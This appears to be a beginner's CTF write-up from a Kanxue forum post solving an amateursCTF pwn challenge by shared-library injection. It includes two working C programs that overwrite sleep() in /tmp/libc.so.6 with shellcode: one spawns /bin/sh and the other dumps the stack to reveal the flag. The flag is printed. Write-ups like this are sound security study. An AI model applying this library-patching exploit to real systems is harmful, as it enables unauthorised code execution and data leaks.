
```
#include <fcntl.h>

#include <unistd.h>

#define SYS_read   0

#define SYS_write  1

#define SYS_open   2

#define SYS_exit   60

#define O_RDWR     2

#define SLEEP_OFFSET 0x000000000011ad50



const unsigned char shellcode[] = {

    0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73,

    0x68, 0x00, 0x50, 0x48, 0xc7, 0xc7, 0x01, 0x00,

    0x00, 0x00, 0x48, 0x89, 0xe6, 0x48, 0xc7, 0xc2,

    0x08, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc0, 0x01,

    0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0xc7, 0xc0,

    0x3b, 0x00, 0x00, 0x00, 0x48, 0x89, 0xe7, 0x48,

    0x31, 0xf6, 0x48, 0x31, 0xd2, 0x0f, 0x05,

};



static long my_syscall(long n, long a1, long a2, long a3) {

    long ret;

    __asm__ volatile(

        "syscall"

        : "=a"(ret)

        : "a"(n), "D"(a1), "S"(a2), "d"(a3)

        : "rcx", "r11", "memory"

    );

    return ret;

}



#define read(fd, buf, n)  my_syscall(SYS_read,  fd, (long)buf, n)

#define write(fd, buf, n) my_syscall(SYS_write, fd, (long)buf, n)

#define open(fn, opt, md) my_syscall(SYS_open, (long)fn, opt, md)

#define exit(code)        my_syscall(SYS_exit, code, 0, 0)

#define print(msg) write(1, msg, sizeof(msg)-1)



void _start() {

    char buf[1024];

    long cur = 0;

    int fd = open("/tmp/libc.so.6", O_RDWR, 0);

    if (fd < 0) {

        print("open failed\n");

        exit(1);

    }

    while (cur < SLEEP_OFFSET) {

        long need = SLEEP_OFFSET - cur;

        long chunk = (need < 1024) ? need : 1024;

        long r = read(fd, buf, chunk);

        if (r <= 0) {

            print("read failed\n");

            exit(2);

        }

        cur += r;

    }

    long w = write(fd, shellcode, sizeof(shellcode));

    if (w != sizeof(shellcode)) {

        print("write failed\n");

        exit(3);

    }

    exit(0);

}
```

![](https://bbs.kanxue.com/upload/attach/202511/971598_UX953HJ3KEJURK3.webp)

but flag is still the fake, and i can not see the `hook.sh` or somethingelse.

WHY

# stage2. print stack

ok after looking these shs, i should konw flag will never appear in your `/tmp/flag`, its been changed

thank you for hinting me![](https://bbs.kanxue.com/upload/attach/202511/971598_BK8ERQNVGN4PPDW.webp)

then i will rewrite our shellcode

```
#include <unistd.h>

#include <fcntl.h>



#define SYS_read   0

#define SYS_write  1

#define SYS_open   2

#define SYS_exit   60



#define O_RDWR 2

#define SLEEP_OFFSET 0x000000000011ad50ULL

static long my_syscall(long n, long a1, long a2, long a3) {

    long ret;

    __asm__ volatile(

        "syscall"

        : "=a"(ret)

        : "a"(n), "D"(a1), "S"(a2), "d"(a3)

        : "rcx", "r11", "memory"

    );

    return ret;

}



#define read(fd,buf,n)   my_syscall(SYS_read,  fd, (long)buf, n)

#define write(fd,buf,n)  my_syscall(SYS_write, fd, (long)buf, n)

#define open(fn,opt,md)  my_syscall(SYS_open,  (long)fn, opt, md)

#define exit(n)          my_syscall(SYS_exit,  n, 0, 0)

#define print(msg)       write(1, msg, sizeof(msg)-1)



const unsigned char shellcode[] = {

    0x48,0xC7,0xC0,0x01,0x00,0x00,0x00,        // mov rax,1 (SYS_write)

    0x48,0xC7,0xC7,0x01,0x00,0x00,0x00,        // mov rdi,1 (stdout)

    0x48,0x89,0xE6,                            // mov rsi,rsp

    0x48,0xC7,0xC2,0x00,0x04,0x00,0x00,        // mov rdx,0x400

    0x0F,0x05,                                  // syscall



    0x48,0xC7,0xC0,0x3C,0x00,0x00,0x00,        // mov rax,60 (exit)

    0x48,0x31,0xFF,                            // xor rdi,rdi

    0x0F,0x05                                   // syscall

};



void _start() {

    char buf[1024];

    long cur = 0;



    int fd = open("/tmp/libc.so.6", O_RDWR, 0);

    if (fd < 0) {

        print("open failed\n");

        exit(1);

    }



    // Seek manually by reading chunks (no lseek allowed)

    while (cur < SLEEP_OFFSET) {

        long need = SLEEP_OFFSET - cur;

        long chunk = (need < sizeof(buf)) ? need : sizeof(buf);

        long r = read(fd, buf, chunk);

        if (r <= 0) {

            print("read failed\n");

            exit(2);

        }

        cur += r;

    }



    // Write shellcode in place of sleep()

    long w = write(fd, shellcode, sizeof(shellcode));

    if (w != sizeof(shellcode)) {

        print("write failed\n");

        exit(3);

    }



    print("patch OK\n");

    exit(0);

}
```

![](https://bbs.kanxue.com/upload/attach/202511/971598_YKBPTE22GTTKAQQ.webp)

finally we get it.

wtffffffffffffffffffffffffffffffffffff

amateursCTF{i_love_shared_library_injection}

In the end, i will express my love for PWN again.

i am a beginner, but i would to use my time to stuck in.

i will try my best to become a PWN master.

u can seeeeeeee how i happy to get flag.

Ok, if you like this plz give me a star haaaaaaaaaa, see you soooon.

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)

最后于  2025-11-22 19:06

被H1m编辑

，原因：

[#专题](https://bbs.kanxue.com/forum-171-1-186.htm)

[#题解集锦](https://bbs.kanxue.com/forum-171-1-187.htm)
